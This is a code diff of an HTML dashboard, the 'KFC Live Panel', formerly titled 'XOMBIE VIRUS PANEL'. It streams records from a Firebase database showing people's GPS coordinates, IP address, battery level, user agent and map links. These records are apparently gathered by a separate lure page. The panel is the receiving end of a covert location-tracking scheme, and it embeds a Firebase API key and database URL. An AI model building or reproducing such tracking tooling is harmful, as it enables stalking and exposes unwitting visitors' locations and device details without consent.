@@ -1,45 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>XOMBIE Panel</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KFC Panel - Live Data</title>
   <style>
     body {
-      background: #000;
-      color: #0f0;
+      background: #0d0d0d;
+      color: #fff;
       font-family: 'Courier New', monospace;
-      padding: 20px;
+      padding: 30px;
     }
-    .box {
-      border: 1px solid #0f0;
-      padding: 10px;
-      margin: 10px 0;
-      background: #111;
+    h1 {
+      color: #ffcc00;
+      text-align: center;
+      margin-bottom: 30px;
     }
-    a { color: #0af; }
+    .card {
+      border: 2px solid #ff0000;
+      border-radius: 15px;
+      padding: 15px;
+      margin-bottom: 20px;
+      background: #1a1a1a;
+      box-shadow: 0 0 10px #ff0000;
+    }
+    .map-link {
+      color: #00ccff;
+      text-decoration: none;
+    }
+    .map-link:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
-  <h1>☣️ XOMBIE VIRUS PANEL</h1>
-  <div class="box" id="output">Loading...</div>
+  <h1>🔥 KFC Live Panel 🔥</h1>
+  <div id="data-container"></div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
   <script>
-    const data = JSON.parse(localStorage.getItem("kfcData"));
-    const output = document.getElementById("output");
+    // Replace with your own config from Firebase
+  const firebaseConfig = {
+  apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
+  authDomain: "kfc-tracker.firebaseapp.com",
+  databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
+  projectId: "kfc-tracker",
+  storageBucket: "kfc-tracker.firebasestorage.app",
+  messagingSenderId: "127099679000",
+  appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
+  measurementId: "G-EPEXKK3S37"
+};
 
-    if (data) {
-      output.innerHTML = `
-        <b>🕒 Time:</b> ${data.time}<br>
-        <b>📍 Latitude:</b> ${data.lat}<br>
-        <b>📍 Longitude:</b> ${data.lon}<br>
-        <b>🎯 Accuracy:</b> ${data.accuracy} meters<br>
-        <b>🌐 IP:</b> ${data.ip}<br>
-        <b>🔋 Battery:</b> ${data.battery}<br>
-        <b>🧠 User Agent:</b> ${data.ua}<br>
-        <b>📌 Map:</b> <a href="${data.map}" target="_blank">Open in Google Maps</a>
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const container = document.getElementById("data-container");
+
+    db.ref("kfc_locations").on("child_added", (snapshot) => {
+      const data = snapshot.val();
+      const card = document.createElement("div");
+      card.className = "card";
+      card.innerHTML = `
+        <strong>🕒 Time:</strong> ${data.timestamp}<br>
+        <strong>📍 Latitude:</strong> ${data.lat}<br>
+        <strong>📍 Longitude:</strong> ${data.lon}<br>
+        <strong>🎯 Accuracy:</strong> ${data.accuracy} meters<br>
+        <strong>🌐 IP Address:</strong> ${data.ip}<br>
+        <strong>🔋 Battery:</strong> ${data.battery}<br>
+        <strong>🧠 User Agent:</strong> ${data.userAgent}<br>
+        <strong>📌 Map:</strong> <a class="map-link" target="_blank" href="${data.mapUrl}">View on Google Maps</a>
       `;
-    } else {
-      output.innerText = "❌ No location data found. Please run the KFC page first.";
-    }
+      container.prepend(card); // Latest on top
+    });
   </script>
 </body>
 </html>
